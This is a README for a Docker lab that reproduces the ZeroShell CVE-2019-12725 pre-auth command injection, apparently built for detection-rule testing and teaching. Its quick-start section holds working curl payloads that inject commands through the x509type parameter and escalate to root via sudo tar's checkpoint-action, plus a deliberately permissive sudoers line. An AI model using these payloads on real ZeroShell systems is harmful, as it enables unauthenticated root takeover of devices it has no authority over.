# ZeroShell CVE-2019-12725 — Minimal Vulnerable Lab

This Docker image reproduces **only** the vulnerable code shape of ZeroShell ≤ 3.9.0's `kerbynet` CGI. It is **not** a copy of the ZeroShell distribution — the original project is unmaintained and ships as a ~700 MB ISO. This lab gives you a 60 MB container you can spin up in seconds for:

- Validating Sigma / Suricata rules
- Demonstrating GTFOBins `sudo tar` privilege escalation
- Teaching pre-auth command-injection patterns
- Running the `exploit.py` / `extract_iocs.py` scripts in this lab

## Quick Start

```bash
# Build & run
docker compose up -d

# Verify the CGI is responding
curl -s "http://localhost:8080/cgi-bin/kerbynet?Action=Render&Object=sysinfo"

# Trigger the bug — pre-auth `id` execution
curl -s "http://localhost:8080/cgi-bin/kerbynet?Action=x509view&Section=NoAuthREQ&User=&x509type=%27%0Aid%0A%27"
#  → returns:  uid=33(www-data) gid=33(www-data) groups=33(www-data)

# Privilege escalation via sudo tar GTFOBins
curl -s "http://localhost:8080/cgi-bin/kerbynet?Action=x509view&Section=NoAuthREQ&User=&x509type=%27%0A/etc/sudo%20tar%20-cf%20/dev/null%20/dev/null%20--checkpoint=1%20--checkpoint-action=exec=%27id%27%0A%27"
#  → returns:  uid=0(root) gid=0(root) groups=0(root)

# Clean up
docker compose down
```

## Sudoers Mapping (key vulnerability ingredient)

```
www-data ALL=(root) NOPASSWD: /usr/bin/openssl, /usr/bin/tar
```

This mirrors the real ZeroShell which lets `apache` (UID 1000) run `openssl verify` and `tar` without a password. Combined with the unsafe shell concatenation in `kerbynet.cgi`, it forms the complete pre-auth-to-root chain.

## Differences from real ZeroShell

| Aspect | Real ZeroShell 3.9.0 | This Lab |
|---|---|---|
| Web user | `apache` UID 1000 | `www-data` UID 33 |
| CGI binary | Compiled `kerbynet` (C) | Bash `kerbynet.cgi` |
| Sudo path | `/etc/sudo` (symlinked) | `/etc/sudo` (symlinked) |
| Vulnerability shape | Identical | Identical |
| Persistence mechanism | `/Database/var/register/system/startup/scripts/*/File` | Not reproduced (no implant) |
| Full UI | Yes (~700 MB ISO) | No (only vulnerable endpoint) |

For a **complete** environment with the trojan implant and persistence path, use the original challenge files at `~/Security/Misc/2024长城杯&CISCN-威胁流量分析-zeroshell/`.

## Safety Notice

This image is intended for **isolated security research**. It contains an intentionally vulnerable CGI and a permissive sudoers file. **Do not expose this container to a network you do not fully control.** The compose file binds to `127.0.0.1` by default for this reason.
